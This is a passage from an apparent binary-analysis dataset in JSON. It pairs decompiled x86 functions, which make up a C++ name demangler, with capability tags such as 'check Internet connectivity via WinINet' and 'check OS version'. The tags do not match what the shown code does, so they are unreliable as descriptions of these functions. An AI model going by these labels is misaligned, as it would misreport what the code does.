*puVar16;\n            bVar20 = *puVar12 == *puVar16;\n            puVar12 = puVar12 + 1;\n            puVar16 = puVar16 + 1;\n        } while (bVar20);\n        if ((!bVar17 && !bVar20) == bVar17) {\n            uVar10 = fcn.0040f7c0();\n            goto code_r0x0040ee75;\n        }\n        puVar12 = ppuVar5[3];\n        if (puVar12 != 0x1) {\n            if (puVar12 < 2) goto joined_r0x0040eec2;\n            if (puVar12 != 0x2) {\n                if (puVar12 != 0x3) {\n                    return 0;\n                }\n                bVar17 = false;\n                bVar20 = puVar15 == NULL;\n                if (bVar20) {\n                    return 0;\n                }\n                iVar11 = 3;\n                puVar12 = puVar15;\n                puVar16 = 0x50377f;\n                do {\n                    if (iVar11 == 0) break;\n                    iVar11 = iVar11 + -1;\n                    bVar17 = *puVar12 < *puVar16;\n                    bVar20 = *puVar12 == *puVar16;\n                    puVar12 = puVar12 + 1;\n                    puVar16 = puVar16 + 1;\n                } while (bVar20);\n                if ((!bVar17 && !bVar20) == bVar17) {\n                    fcn.0040ea70();\n                }\n                else {\n                    if (*puVar15 != 0x66) {\n                        if (*puVar15 != 0x6e) {\n                            return 0;\n                        }\n                        if ((puVar15[1] != 0x77) && (puVar15[1] != 0x61)) {\n                            return 0;\n                        }\n                        fcn.0040f0f0();\n                        fcn.0040f7c0();\n                        pcVar14 = *(in_EAX + 0xc);\n                        cVar2 = *pcVar14;\n                        if (cVar2 == 'E') {\n                            *(in_EAX + 0xc) = pcVar14 + 1;\n                            iVar11 = 0;\n                        }\n                        else if (cVar2 == 'p') {\n                            if (pcVar14[1] != 'i') {\n                                return 0;\n                            }\n                            *(in_EAX + 0xc) = pcVar14 + 2;\n                            iVar11 = fcn.0040f0f0();\n                        }\n                        else {\n                            if (cVar2 != 'i') {\n                                return 0;\n                            }\n                            if (pcVar14[1] != 'l') {\n                                return 0;\n                            }\n                            iVar11 = fcn.0040ea70();\n                        }\n                        goto code_r0x0040ed29;\n                    }\n                    fcn.004100c0();\n                }\n                fcn.0040ea70();\n                iVar11 = fcn.0040ea70();\n                if (iVar11 == 0) {\n                    return NULL;\n                }\ncode_r0x0040ed29:\n                uVar10 = fcn.0040df00(iVar11);\n                uVar10 = fcn.0040df00(uVar10);\n                puVar7 = fcn.0040df00(uVar10);\n                return puVar7;\n            }\n            if (puVar15 == NULL) {\n                return 0;\n            }\n            if ((*ppuVar5)[1] == 99) {\n                uVar3 = **ppuVar5;\n                uVar6 = uVar3 + 0x9d;\n                if ((1 < uVar6) && (uVar6 = uVar3 + 0x8e,  1 < uVar6)) goto code_r0x0040ef58;\n                uVar21 = uVar6 == 1;\n                uVar18 = uVar6 == 0;\n                fcn.0040f7c0();\n            }\n            else {\ncode_r0x0040ef58:\n                uVar18 = *puVar15 < 0x66;\n                uVar21 = *puVar15 == 0x66;\n                if (uVar21) {\n                    fcn.004100c0();\n                }\n                else {\n                    fcn.0040ea70();\n                }\n            }\n            iVar11 = 3;\n            puVar12 = puVar15;\n            puVar16 = 0x503776;\n            do {\n                if (iVar11 == 0) break;\n                iVar11 = iVar11 + -1;\n                uVar18 = *puVar12 < *puVar16;\n                uVar21 = *puVar12 == *puVar16;\n                puVar12 = puVar12 + 1;\n                puVar16 = puVar16 + 1;\n            } while (uVar21);\n            bVar17 = false;\n            bVar20 = (!uVar18 && !uVar21) == uVar18;\n            if (bVar20) {\n                uVar10 = fcn.0040f0f0();\n            }\n            else {\n                iVar11 = 3;\n                puVar12 = puVar15;\n                puVar16 = 0x503779;\n                do {\n                    if (iVar11 == 0) break;\n                    iVar11 = iVar11 + -1;\n                    bVar17 = *puVar12 < *puVar16;\n                    bVar20 = *puVar12 == *puVar16;\n                    puVar12 = puVar12 + 1;\n                    puVar16 = puVar16 + 1;\n                } while (bVar20);\n                bVar19 = false;\n                bVar17 = (!bVar17 && !bVar20) == bVar17;\n                if (!bVar17) {\n                    iVar11 = 3;\n                    puVar12 = 0x50377c;\n                    do {\n                        if (iVar11 == 0) break;\n                        iVar11 = iVar11 + -1;\n                        bVar19 = *puVar15 < *puVar12;\n                        bVar17 = *puVar15 == *puVar12;\n                        puVar15 = puVar15 + 1;\n                        puVar12 = puVar12 + 1;\n                    } while (bVar17);\n                    if ((!bVar19 && !bVar17) != bVar19) {\n                        uVar10 = fcn.0040ea70();\n                        goto code_r0x0040efd8;\n                    }\n                }\n                uVar10 = fcn.00410650();\n                if (**(in_EAX + 0xc) == 'I') {\n                    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n                    uVar10 = fcn.0040f1a0();\n                    uVar10 = fcn.0040df00(uVar10);\n                }\n            }\ncode_r0x0040efd8:\n            uVar10 = fcn.0040df00(uVar10);\n            puVar7 = fcn.0040df00(uVar10);\n            return puVar7;\n        }\n        uVar6 = *puVar15;\n        if (((uVar6 == 0x70) || (uVar6 == 0x6d)) && (uVar6 == puVar15[1])) {\n            puVar16 = *(in_EAX + 0xc);\n            bVar17 = *puVar16 < 0x5f;\n            bVar20 = *puVar16 == 0x5f;\n            if (bVar20) {\n                *(in_EAX + 0xc) = puVar16 + 1;\n                goto code_r0x0040ee32;\n            }\n        }\n        else {\ncode_r0x0040ee32:\n            bVar17 = false;\n            puVar12 = NULL;\n            bVar20 = true;\n        }\n        iVar11 = 3;\n        puVar16 = 0x503773;\n        do {\n            if (iVar11 == 0) break;\n            iVar11 = iVar11 + -1;\n            bVar17 = *puVar15 < *puVar16;\n            bVar20 = *puVar15 == *puVar16;\n            puVar15 = puVar15 + 1;\n            puVar16 = puVar16 + 1;\n        } while (bVar20);\n        if ((!bVar17 && !bVar20) != bVar17) goto code_r0x0040ee51;\n        uVar10 = fcn.0040f1a0();\n    }\n    else {\n        if (iVar11 == 0x32) {\n            puVar12 = piVar8[2];\n            if (puVar12 != 0x1) {\n                if (1 < puVar12) {\n                    return 0;\n                }\njoined_r0x0040eec2:\n                if (puVar12 == NULL) {\n                    puVar7 = fcn.0040df00(0);\n                    return puVar7;\n                }\n                return 0;\n            }\n            uVar10 = fcn.0040ea70();\n            goto code_r0x0040ee75;\n        }\n        if (iVar11 != 0x33) {\n            return 0;\n        }\n        if (**(in_EAX + 0xc) == '_') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            uVar10 = fcn.0040f0f0();\n            goto code_r0x0040ee75;\n        }\n        puVar12 = NULL;\ncode_r0x0040ee51:\n        uVar10 = fcn.0040ea70();\n    }\n    if (puVar12 != NULL) {\n        uVar10 = fcn.0040df00(uVar10);\n    }\ncode_r0x0040ee75:\n    puVar7 = fcn.0040df00(uVar10);\n    return puVar7;\n}\n",
        "token_count": 4496
    },
    "0040f1a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040f1a0(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t *piVar6;\n    int32_t aiStack32 [4];\n    \n    pcVar5 = *(in_EAX + 0xc);\n    uVar4 = *(in_EAX + 0x28);\n    cVar2 = *pcVar5;\n    if (cVar2 == 'E') {\n        *(in_EAX + 0xc) = pcVar5 + 1;\n        uVar4 = fcn.0040df00(0);\n        return uVar4;\n    }\n    aiStack32[0] = 0;\n    piVar6 = aiStack32;\n    do {\n        if (cVar2 == 'L') {\n            iVar3 = fcn.0040e8f0();\n        }\n        else if (cVar2 < 'M') {\n            if (1 < cVar2 + 0xb7U) goto code_r0x0040f250;\n            iVar3 = fcn.0040f2b0();\n        }\n        else if (cVar2 == 'X') {\n            uVar1 = *(in_EAX + 0x30);\n            *(in_EAX + 0x30) = 1;\n            *(in_EAX + 0xc) = pcVar5 + 1;\n            iVar3 = fcn.0040ea70();\n            *(in_EAX + 0x30) = uVar1;\n            if (**(in_EAX + 0xc) != 'E') {\n                return 0;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        }\n        else {\ncode_r0x0040f250:\n            iVar3 = fcn.0040f7c0();\n        }\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.0040df00(0);\n        *piVar6 = iVar3;\n        if (iVar3 == 0) {\n            return 0;\n        }\n        pcVar5 = *(in_EAX + 0xc);\n        piVar6 = iVar3 + 0xc;\n        cVar2 = *pcVar5;\n        if (cVar2 == 'E') {\n            *(in_EAX + 0x28) = uVar4;\n            *(in_EAX + 0xc) = pcVar5 + 1;\n            return aiStack32[0];\n        }\n    } while( true );\n}\n",
        "token_count": 591
    },
    "0040f7c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.0040f7c0(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t **ppiVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    char cVar10;\n    char *pcVar11;\n    uint *puVar12;\n    char *pcVar13;\n    char *pcVar14;\n    int32_t *piStack32;\n    \n    pcVar13 = *(in_EAX + 0xc);\n    iVar5 = fcn.0040e690();\n    if (iVar5 != 0) {\n        ppiVar6 = fcn.00410350();\n        if (ppiVar6 == NULL) {\n            return NULL;\n        }\n        if (**(in_EAX + 0xc) == 'F') {\n            piVar7 = fcn.004105e0();\n            *ppiVar6 = piVar7;\n        }\n        else {\n            piVar7 = fcn.0040f7c0();\n            *ppiVar6 = piVar7;\n        }\n        if (piVar7 == NULL) {\n            return NULL;\n        }\n        if (*piVar7 - 0x1fU < 2) {\n            piVar1 = piVar7[2];\n            piVar7[2] = piStack32;\n            piStack32 = *ppiVar6;\n            *ppiVar6 = piVar1;\n        }\n        if (piStack32 == NULL) {\n            return NULL;\n        }\n        iVar5 = *(in_EAX + 0x20);\n        if (*(in_EAX + 0x24) <= iVar5) {\n            return NULL;\n        }\n        *(*(in_EAX + 0x1c) + iVar5 * 4) = piStack32;\n        *(in_EAX + 0x20) = iVar5 + 1;\n        return piStack32;\n    }\n    // switch table (75 cases) at 0x5037ac\n    switch(*pcVar13 - 0x30U & 0xff) {\n    case 0:\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 9:\n    case 0x1e:\n    case 0x2a:\n        piStack32 = fcn.0040f2e0();\n        break;\n    default:\n        goto code_r0x0040f833;\n    case 0x11:\n        pcVar14 = pcVar13 + 1;\n        *(in_EAX + 0xc) = pcVar14;\n        if (pcVar13[1] != '_') {\n            pcVar11 = pcVar14;\n            if (pcVar13[1] - 0x30U < 10) {\n                do {\n                    pcVar13 = pcVar11;\n                    pcVar11 = pcVar13 + 1;\n                    *(in_EAX + 0xc) = pcVar11;\n                } while (pcVar13[1] - 0x30U < 10);\n                iVar5 = *(in_EAX + 0x14);\n                if (*(in_EAX + 0x18) <= iVar5) {\n                    return NULL;\n                }\n                puVar12 = iVar5 * 0x10 + *(in_EAX + 0x10);\n                puVar12[1] = 0;\n                *(in_EAX + 0x14) = iVar5 + 1;\n                if (pcVar11 - pcVar14 == 0) {\n                    return NULL;\n                }\n                puVar12[1] = 0;\n                *puVar12 = 0;\n                puVar12[2] = pcVar14;\n                puVar12[3] = pcVar11 - pcVar14;\n                cVar10 = pcVar13[1];\n            }\n            else {\n                uVar8 = *(in_EAX + 0x30);\n                *(in_EAX + 0x30) = 1;\n                iVar5 = fcn.0040ea70();\n                *(in_EAX + 0x30) = uVar8;\n                if (iVar5 == 0) {\n                    return NULL;\n                }\n                pcVar11 = *(in_EAX + 0xc);\n                cVar10 = *pcVar11;\n            }\n            pcVar14 = pcVar11;\n            if (cVar10 != '_') {\n                return NULL;\n            }\n        }\n        *(in_EAX + 0xc) = pcVar14 + 1;\n        uVar8 = fcn.0040f7c0();\n        piStack32 = fcn.0040df00(uVar8);\n        break;\n    case 0x13:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0040f7c0();\n        piStack32 = fcn.0040df00(0);\n        break;\n    case 0x14:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        if (pcVar13[1] == '\\0') {\n            return NULL;\n        }\n        *(in_EAX + 0xc) = pcVar13 + 2;\n    // switch table (49 cases) at 0x5038d8\n        switch(pcVar13[1]) {\n        case 'F':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x2c;\n            cVar10 = pcVar13[2];\n            *(piVar7 + 3) = cVar10 - 0x30U < 10;\n            if (cVar10 - 0x30U < 10) {\n                fcn.0040e0d0();\n            }\n            iVar5 = fcn.0040f7c0();\n            piVar7[2] = iVar5;\n            if (piVar7[2] == 0) {\n                return NULL;\n            }\n            fcn.0040e0d0();\n            pcVar13 = *(in_EAX + 0xc);\n            cVar10 = '\\0';\n            if (*pcVar13 != '\\0') {\n                *(in_EAX + 0xc) = pcVar13 + 1;\n                cVar10 = *pcVar13;\n            }\n            *(piVar7 + 0xe) = cVar10 == 's';\n            return piVar7;\n        default:\n            return NULL;\n        case 'T':\n        case 't':\n            uVar8 = *(in_EAX + 0x30);\n            *(in_EAX + 0x30) = 1;\n            fcn.0040ea70();\n            *(in_EAX + 0x30) = uVar8;\n            piStack32 = fcn.0040df00(0);\n            if (piStack32 == NULL) {\n                return NULL;\n            }\n            pcVar13 = *(in_EAX + 0xc);\n            if (*pcVar13 == '\\0') {\n                return NULL;\n            }\n            *(in_EAX + 0xc) = pcVar13 + 1;\n            if (*pcVar13 != 'E') {\n                return NULL;\n            }\n            goto code_r0x0040f8d8;\n        case 'a':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                return NULL;\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            *(in_EAX + 0x14) = iVar5 + 1;\n            piVar7[1] = 0;\n            *piVar7 = 0;\n            piVar7[2] = \"auto\";\n            piVar7[3] = 4;\n            return piVar7;\n        case 'c':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                return NULL;\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            *(in_EAX + 0x14) = iVar5 + 1;\n            piVar7[1] = 0;\n            *piVar7 = 0;\n            piVar7[2] = \"decltype(auto)\";\n            piVar7[3] = 0xe;\n            return piVar7;\n        case 'd':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x504c5c;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n            return piVar7;\n        case 'e':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x504c70;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 10;\n            return piVar7;\n        case 'f':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x504c48;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n            return piVar7;\n        case 'h':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x504c84;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 4;\n            return piVar7;\n        case 'i':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x504cac;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 8;\n            return piVar7;\n        case 'n':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x504cc0;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 0x11;\n            return piVar7;\n        case 'p':\n            fcn.0040f7c0();\n            piStack32 = fcn.0040df00(0);\n            break;\n        case 's':\n            iVar5 = *(in_EAX + 0x14);\n            if (*(in_EAX + 0x18) <= iVar5) {\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            piVar7 = iVar5 * 0x10 + *(in_EAX + 0x10);\n            piVar7[1] = 0;\n            *(in_EAX + 0x14) = iVar5 + 1;\n            *piVar7 = 0x27;\n            piVar7[2] = 0x504c98;\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 8;\n            return piVar7;\n        case 'v':\n            if (pcVar13[2] == '_') {\n                uVar8 = *(in_EAX + 0x30);\n                *(in_EAX + 0x30) = 1;\n                *(in_EAX + 0xc) = pcVar13 + 3;\n                iVar5 = fcn.0040ea70();\n                *(in_EAX + 0x30) = uVar8;\n            }\n            else {\n                iVar5 = fcn.0040e190();\n            }\n            if (iVar5 == 0) {\n                return NULL;\n            }\n            if (**(in_EAX + 0xc) != '_') {\n                return NULL;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            uVar8 = fcn.0040f7c0();\n            piStack32 = fcn.0040df00(uVar8);\n        }\n        break;\n    case 0x16:\n        piStack32 = fcn.004105e0();\n        break;\n    case 0x17:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0040f7c0();\n        piStack32 = fcn.0040df00(0);\n        break;\n    case 0x1d:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        iVar5 = fcn.0040f7c0();\n        if (iVar5 == 0) {\n            return NULL;\n        }\n        iVar5 = fcn.0040f7c0();\n        if (iVar5 == 0) {\n            return NULL;\n        }\n        piStack32 = fcn.0040df00(iVar5);\n        break;\n    case 0x1f:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0040f7c0();\n        piStack32 = fcn.0040df00(0);\n        break;\n    case 0x20:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0040f7c0();\n        piStack32 = fcn.0040df00(0);\n        break;\n    case 0x22:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0040f7c0();\n        piStack32 = fcn.0040df00(0);\n        break;\n    case 0x23:\n        cVar10 = pcVar13[1];\n        if (((9 < cVar10 - 0x30U) && (cVar10 != '_')) && (0x19 < cVar10 + 0xbfU)) {\n            piStack32 = fcn.0040f2e0();\n            if (piStack32 == NULL) {\n                return NULL;\n            }\n            if (*piStack32 == 0x18) {\n                return piStack32;\n            }\n            goto code_r0x0040f8d8;\n        }\n        piVar7 = fcn.0040e440();\n        pcVar13 = *(in_EAX + 0xc);\n        if (*pcVar13 != 'I') {\n            return piVar7;\n        }\ncode_r0x0040fa12:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        uVar8 = fcn.0040f1a0();\ncode_r0x0040fa1c:\n        piStack32 = fcn.0040df00(uVar8);\n        break;\n    case 0x24:\n        piStack32 = fcn.0040e210();\n        pcVar13 = *(in_EAX + 0xc);\n        if (*pcVar13 == 'I') {\n            if (*(in_EAX + 0x34) == 0) {\n                if (piStack32 == NULL) {\n                    return NULL;\n                }\n                iVar5 = *(in_EAX + 0x20);\n                if (*(in_EAX + 0x24) <= iVar5) {\n                    return NULL;\n                }\n                *(*(in_EAX + 0x1c) + iVar5 * 4) = piStack32;\n                *(in_EAX + 0x20) = iVar5 + 1;\n                uVar8 = 0;\n                if (*pcVar13 + 0xb7U < 2) goto code_r0x0040fa12;\n                goto code_r0x0040fa1c;\n            }\n            uVar8 = *(in_EAX + 0x2c);\n            uVar3 = *(in_EAX + 0x14);\n            uVar4 = *(in_EAX + 0x20);\n            *(in_EAX + 0xc) = pcVar13 + 1;\n            uVar9 = fcn.0040f1a0();\n            if (**(in_EAX + 0xc) == 'I') {\n                if (piStack32 == NULL) {\n                    return NULL;\n                }\n                iVar5 = *(in_EAX + 0x20);\n                if (*(in_EAX + 0x24) <= iVar5) {\n                    return NULL;\n                }\n                *(*(in_EAX + 0x1c) + iVar5 * 4) = piStack32;\n                *(in_EAX + 0x20) = iVar5 + 1;\n                piStack32 = fcn.0040df00(uVar9);\n            }\n            else {\n                *(in_EAX + 0xc) = pcVar13;\n                *(in_EAX + 0x14) = uVar3;\n                *(in_EAX + 0x2c) = uVar8;\n                *(in_EAX + 0x20) = uVar4;\n            }\n        }\n        break;\n    case 0x25:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        uVar8 = fcn.0040e270();\n        if (**(in_EAX + 0xc) == 'I') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n            uVar8 = fcn.0040f1a0();\n            uVar8 = fcn.0040df00(uVar8);\n        }\n        fcn.0040f7c0();\n        piStack32 = fcn.0040df00(uVar8);\n        break;\n    case 0x31:\n    case 0x32:\n    case 0x33:\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n    case 0x43:\n    case 0x44:\n    case 0x46:\n    case 0x47:\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n        iVar2 = *(in_EAX + 0x14);\n        iVar5 = (*pcVar13 * 5 + -0x1e5) * 4;\n        if (*(in_EAX + 0x18) <= iVar2) {\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        piVar7 = iVar2 * 0x10 + *(in_EAX + 0x10);\n        piVar7[1] = 0;\n        *(in_EAX + 0x14) = iVar2 + 1;\n        iVar2 = *(iVar5 + 0x504a44);\n        *piVar7 = 0x27;\n        piVar7[2] = iVar5 + 0x504a40;\n        *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + iVar2;\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        return piVar7;\n    case 0x45:\n        *(in_EAX + 0xc) = pcVar13 + 1;\n        fcn.0040e270();\n        piStack32 = fcn.0040df00(0);\n    }\n    if (piStack32 != NULL) {\ncode_r0x0040f8d8:\n        iVar5 = *(in_EAX + 0x20);\n        if (iVar5 < *(in_EAX + 0x24)) {\n            *(*(in_EAX + 0x1c) + iVar5 * 4) = piStack32;\n            *(in_EAX + 0x20) = iVar5 + 1;\n            return piStack32;\n        }\n    }\ncode_r0x0040f833:\n    return NULL;\n}\n",
        "token_count": 5140
    },
    "004100c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * fcn.004100c0(void)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint *puVar5;\n    char cVar6;\n    int32_t iVar7;\n    char cVar8;\n    bool bVar9;\n    bool bVar10;\n    int32_t iStack36;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    if (*pcVar1 == '\\0') {\n        cVar8 = '\\0';\n    }\n    else {\n        *(in_EAX + 0xc) = pcVar1 + 1;\n        cVar8 = *pcVar1;\n        if (pcVar1[1] != '\\0') {\n            *(in_EAX + 0xc) = pcVar1 + 2;\n            cVar6 = pcVar1[1];\n            if (cVar8 == 'v') {\n                if (cVar6 - 0x30U < 10) {\n                    iVar4 = fcn.0040e270();\n                    iVar7 = *(in_EAX + 0x14);\n                    if (*(in_EAX + 0x18) <= iVar7) {\n                        return NULL;\n                    }\n                    puVar5 = iVar7 * 0x10 + *(in_EAX + 0x10);\n                    puVar5[1] = 0;\n                    *(in_EAX + 0x14) = iVar7 + 1;\n                    if (iVar4 == 0) {\n                        return NULL;\n                    }\n                    puVar5[1] = 0;\n                    *puVar5 = 0x32;\n                    puVar5[3] = iVar4;\n                    puVar5[2] = cVar6 + -0x30;\n                    return puVar5;\n                }\n            }\n            else if ((cVar8 == 'c') && (cVar6 == 'v')) {\n                uVar2 = *(in_EAX + 0x34);\n                *(in_EAX + 0x34) = *(in_EAX + 0x30) == 0;\n                fcn.0040f7c0();\n                if (*(in_EAX + 0x34) == 0) {\n                    puVar5 = fcn.0040df00(0);\n                }\n                else {\n                    puVar5 = fcn.0040df00(0);\n                }\n                *(in_EAX + 0x34) = uVar2;\n                return puVar5;\n            }\n            goto code_r0x004100ea;\n        }\n    }\n    cVar6 = '\\0';\ncode_r0x004100ea:\n    iVar7 = 0;\n    iStack36 = 0x43;\n    do {\n        iVar4 = (iStack36 - iVar7) / 2 + iVar7;\n        pcVar1 = *(iVar4 * 0x10 + 0x5044c0);\n        bVar10 = SBORROW1(*pcVar1, cVar8);\n        cVar3 = *pcVar1 - cVar8;\n        bVar9 = *pcVar1 == cVar8;\n        if (bVar9) {\n            bVar10 = SBORROW1(pcVar1[1], cVar6);\n            cVar3 = pcVar1[1] - cVar6;\n            bVar9 = cVar3 == '\\0';\n            if (bVar9) {\n                iVar7 = *(in_EAX + 0x14);\n                if (*(in_EAX + 0x18) <= iVar7) {\n                    return NULL;\n                }\n                puVar5 = iVar7 * 0x10 + *(in_EAX + 0x10);\n                puVar5[1] = 0;\n                *(in_EAX + 0x14) = iVar7 + 1;\n                *puVar5 = 0x31;\n                puVar5[2] = iVar4 * 0x10 + 0x5044c0;\n                return puVar5;\n            }\n        }\n        if (bVar9 || bVar10 != cVar3 < '\\0') {\n            iVar7 = iVar4 + 1;\n            iVar4 = iStack36;\n        }\n        iStack36 = iVar4;\n    } while (iVar7 != iStack36);\n    return NULL;\n}\n",
        "token_count": 956
    },
    "00410350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __fastcall fcn.00410350(uint32_t param_1, int32_t **param_2)\n\n{\n    int32_t **ppiVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *pcVar4;\n    uint uVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    int32_t *piVar7;\n    \n    pcVar4 = *(in_EAX + 0xc);\n    cVar2 = *pcVar4;\n    iVar6 = fcn.0040e690();\n    ppiVar1 = param_2;\n    do {\n        if (iVar6 == 0) {\n            if ((((param_1 & 1) == 0) && (cVar2 == 'F')) && (ppiVar1 != param_2)) {\n                piVar7 = *param_2;\n                iVar6 = *piVar7;\n                if (iVar6 != 0x1a) goto code_r0x0041054d;\n                do {\n                    *piVar7 = 0x1d;\n                    while( true ) {\n                        if (ppiVar1 == piVar7 + 2) {\n                            return ppiVar1;\n                        }\n                        piVar7 = piVar7[2];\n                        iVar6 = *piVar7;\n                        if (iVar6 == 0x1a) break;\ncode_r0x0041054d:\n                        if (iVar6 == 0x1b) {\n                            *piVar7 = 0x1e;\n                        }\n                        else if (iVar6 == 0x19) {\n                            *piVar7 = 0x1c;\n                        }\n                    }\n                } while( true );\n            }\n            return ppiVar1;\n        }\n        *(in_EAX + 0xc) = pcVar4 + 1;\n        if (cVar2 == 'r') {\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n            iVar6 = 0;\n        }\n        else if (cVar2 == 'V') {\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 9;\n            iVar6 = 0;\n        }\n        else if (cVar2 == 'K') {\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 6;\n            iVar6 = 0;\n        }\n        else {\n            if (pcVar4[1] == '\\0') {\n                return NULL;\n            }\n            *(in_EAX + 0xc) = pcVar4 + 2;\n            uVar3 = pcVar4[1];\n            if (uVar3 == 0x78) {\n                *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 0x11;\n                iVar6 = 0;\n            }\n            else if ((uVar3 & 0xdf) == 0x4f) 